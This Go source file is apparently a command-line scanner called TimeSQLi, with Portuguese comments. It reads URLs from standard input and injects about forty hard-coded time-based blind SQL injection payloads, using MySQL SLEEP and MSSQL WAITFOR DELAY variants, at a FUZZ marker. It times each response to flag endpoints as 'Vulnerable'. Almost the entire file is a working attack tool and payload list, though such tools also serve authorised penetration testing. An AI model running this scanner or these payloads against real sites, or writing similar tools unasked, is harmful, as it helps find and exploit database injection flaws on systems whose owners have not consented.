package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

const (
	red   = "\033[31m"
	gray  = "\033[90m"
	reset = "\033[0m"
)

func medirTempoRequisicao(url string) float64 {
	inicio := time.Now()

	_, err := http.Get(url)
	if err != nil {
		return 0
	}

	fim := time.Now()
	tempoTotal := fim.Sub(inicio).Seconds()
	return tempoTotal
}

func replacePayloads(baseURL string, tempoSQLi float64, payloads []string) []string {
	var resultURLs []string

	// Converter tempoSQLi para string
	tempoSQLiStr := fmt.Sprintf("%f", tempoSQLi)

	for _, payload := range payloads {
		// Substituir "FUZZ" pelo payload atual e tempoSQLi
		targetURL := strings.Replace(baseURL, "FUZZ", payload, -1)
		targetURL = strings.Replace(targetURL, "tempoSQLi", tempoSQLiStr, -1)
		resultURLs = append(resultURLs, targetURL)
	}

	return resultURLs
}

func testarURLs(tempoSQLi float64, payloads []string) {
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())

		// Substituir "FUZZ" e "tempoSQLi" pelos payloads nas URLs
		resultURLs := replacePayloads(url, tempoSQLi, payloads)

		for _, url := range resultURLs {
			if medirTempoRequisicao(url) >= tempoSQLi {
				fmt.Printf("%sVulnerable: %s%s - {%f}\n", red, url, reset, medirTempoRequisicao(url))
			} else {
				fmt.Printf("%sNot Vulnerable: %s%s\n", gray, url, reset)
			}
		}
	}
}

func main() {
	var tempoSQLi float64

	flag.Float64Var(&tempoSQLi, "t", 0, "Tempo a ser testado.")
	flag.Parse()

	if tempoSQLi == 0 {
		fmt.Println("Uso: TimeSQLi -t <tempo>")
		os.Exit(1)
	}

	payloads := []string{
		"0'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
		"0\\\"XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR\\\"Z",
		"1 or sleep(tempoSQLi)#",
		"1) or sleep(tempoSQLi)#",
		"1) or sleep(tempoSQLi)#",
		"1)) or sleep(tempoSQLi)#",
		"1') WAITFOR DELAY 'tempoSQLi' AND ('1337'='1337",
		"1) WAITFOR DELAY 'tempoSQLi' AND (1337=1337",
		"';%5waitfor%5delay%5'tempoSQLi'%5--%5",
		" AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))bAKL) AND 'vRxe'='vRxe",
		" AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)",
		" AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)#",
		" AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)--",
		" AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))YjoC) AND '%'='",
		" AnD SLEEP(tempoSQLi)",
		" AnD SLEEP(tempoSQLi)#",
		"' AND SLEEP(tempoSQLi)#",
		"' AND SLEEP(tempoSQLi)--",		
		"' AND SLEEP(tempoSQLi) AND 'Jzur'='Jzur",
		"' OR SLEEP(tempoSQLi) OR 'Jzur'='Jzur",
		" AnD SLEEP(tempoSQLi)--",
		"' AnD SLEEP(tempoSQLi) ANd '1",
		" and WAITFOR DELAY 'tempoSQLi'",
		" and WAITFOR DELAY 'tempoSQLi'--",
		") IF (1=1) WAITFOR DELAY 'tempoSQLi'--",
		" ORDER BY SLEEP(tempoSQLi)",
		" ORDER BY SLEEP(tempoSQLi)#",
		" ORDER BY SLEEP(tempoSQLi)--",
		" or sleep(tempoSQLi)#",
		" or sleep(tempoSQLi)=",
		") or sleep(tempoSQLi)=",
		")) or sleep(tempoSQLi)=",
		"' or sleep(tempoSQLi)#",
		"' or sleep(tempoSQLi)='",
		"') or sleep(tempoSQLi)='",
		"')) or sleep(tempoSQLi)='",
		"or SLEEP(tempoSQLi)",
		"or SLEEP(tempoSQLi)#",
		"or SLEEP(tempoSQLi)--",
		"or SLEEP(tempoSQLi)=",
		"or SLEEP(tempoSQLi)='",
		"or WAITFOR DELAY 'tempoSQLi'",
		"or WAITFOR DELAY 'tempoSQLi'--",
	}

	testarURLs(tempoSQLi, payloads)
}
